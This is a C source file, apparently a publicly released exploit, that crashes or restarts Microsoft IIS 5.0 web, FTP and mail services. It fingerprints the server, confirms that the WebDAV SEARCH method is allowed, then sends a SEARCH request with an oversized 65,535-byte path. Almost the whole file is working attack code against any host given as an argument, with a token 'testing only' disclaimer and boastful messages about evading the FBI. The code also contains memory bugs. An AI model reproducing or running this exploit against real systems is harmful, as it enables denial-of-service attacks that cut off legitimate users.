/*
    
Micro$oft IIS DoSser (restarts Web/FTP/Mail service .Terminates  all active Web/FTP/Mail connections....ph33r ;-) )

 >> by Shashank Pandey a.k.a      +(Neo1)+
  
  >>	http://geekgroove.8m.com

  Issue : http://packetstorm.linuxsecurity.com/0305-exploits/iisDoS.txt  
	
 

 coded in seconds .... crappy programming but worx !

 shoutz to all da babes in delhi    :-)


 >> Only for tezting purposes !!! i disclaim everything ....


part of M4TR1X series of codes from me...     ph33r again...;-)


*/


#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")



void graphitte()


{printf("\n********************************** ");
 printf("\n Webdav MICRO$OFT IIS DoSser     * \n");
 printf("+++++++++++++++++++++++++++++++++*\n");
 printf(" by Shashank Pandey              *\n");
 printf(" (reach_shash@linuxmail.org)     *\n");
 printf("********************************** \n");

 

}







char *funk(char tobesent[100],char *host)
{
  int s;  char got[100]; 

  WSADATA wsaData;
      
struct hostent *yo;
struct sockaddr_in heck;
    
     char lala[100];
    

if(WSAStartup(0x0101,&wsaData)!=0) {
      printf("error starting winsock..");
      return 0;
      }




  if ((yo = gethostbyname(host))==0){
    printf("error: can't resolve '%s'",host);
    return 0;
  }




   
  heck.sin_port = htons(80);
  heck.sin_family = AF_INET;
  heck.sin_addr = *((struct in_addr *)yo->h_addr);

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    printf("Error: Unable to create socket");
    
  }

  
  if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
    printf("Error: Cudn't Connect\r\n");
    
  }
 
  
memset(lala,0,sizeof(lala));

sprintf(lala,"%s",tobesent,sizeof(tobesent));
     
      send(s,lala,strlen(lala),0);
   recv(s,got,100,0);


  
    
  
  return got;
    closesocket(s);
    WSACleanup();
    printf("done.\n");

}







int main(int argc, char *argv[])
{
     

  WSADATA wsaData;
      
      
      
      
      int s;char mysend[100];
	  char *gotme;
	  char trash[100];
	  

struct hostent *yo;
	 	  struct sockaddr_in heck;
	  char buffer[65535] ="";
      char myrequest[80000];    
      char content[] =
           "<?xml version=\"1.0\"?>\r\n"
           "<g:searchrequest xmlns:g=\"DAV:\">\r\n"
           "<g:sql>\r\n"
           "Select \"DAV:displayname\" from scope()\r\n"
           "</g:sql>\r\n"
           "</g:searchrequest>\r\n";

  
	  
	  graphitte();
       
     

    

if(WSAStartup(0x0101,&wsaData)!=0) {
      printf("Error :Cudn't initiate winsock!");
      return 0;
      }


if(argc<2)

{printf("\nUsage : %s <I.P./Hostname>\n\n",argv[0]);
  exit(0);}




  if ( (yo = gethostbyname(argv[1]))==0)
  {
    printf("error: can't resolve '%s'",argv[1]);
    return 1;
  }



printf("\nChecking web server %s\n",argv[1]);
gotme=(char *)funk("GET / HTTP/1.0\r\n\n",argv[1]);


if (strstr(gotme,"IIS/5.0") == NULL)
	      
{	 printf("\n\r----> %s is not running IIS 5.0! adios !\n",argv[1]);  } 

      

else

{
	
	
printf("\n\r----> Aww rite! IIS 5.0 found on %s  !\n",argv[1]);







	
sprintf(mysend,"SEARCH / HTTP/1.0\r\n\n",40);

gotme=(char *)funk(mysend,argv[1]);

if (strstr(gotme,"HTTP/1.1 411 Length Required") != NULL)
	      
{	 printf("\n\r----> METHOD SEARCH ALLOWED\r\n"); } 



else

{
	
printf("\n----> Method SEARCH not Allowed ! adios...\n");
exit(0);

}	





   
  heck.sin_port = htons(80);
  heck.sin_family = AF_INET;
  heck.sin_addr = *((struct in_addr *)yo->h_addr);

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
    printf("error: can't create socket");
    return 1;
  }

  
  if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
    printf("Error:Cudn't Connect\r\n");
    return 1;
  }
 
  
  
buffer[sizeof(buffer)]=0x00;

  memset(buffer,'S',sizeof(buffer));
  memset(myrequest,0,sizeof(myrequest));
      memset(trash,0,sizeof(trash));
      sprintf(myrequest,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: ",buffer,argv[1]);
      sprintf(myrequest,"%s%d\r\n\r\n",myrequest,strlen(content));
      printf("\r\nDoSsing the server...<pray>\n");
      send(s,myrequest,strlen(myrequest),0);
      
	  



	  send(s,content,strlen(content),0);
      
	  
	  
	  
      recv(s,trash,sizeof(trash),0);
      if(trash[0]==0x00) 
	  {
      printf("Server is DoSsed! Now run !! F-B-eyee is after j00...\r\n");
	  
      } 
	  
	  else
      
		  
	  printf("Server is prolly patched.\r\n");
      
	  closesocket(s);
  

}
	
	
	
	
	WSACleanup();
    
	
	
	
	
return 1;
}

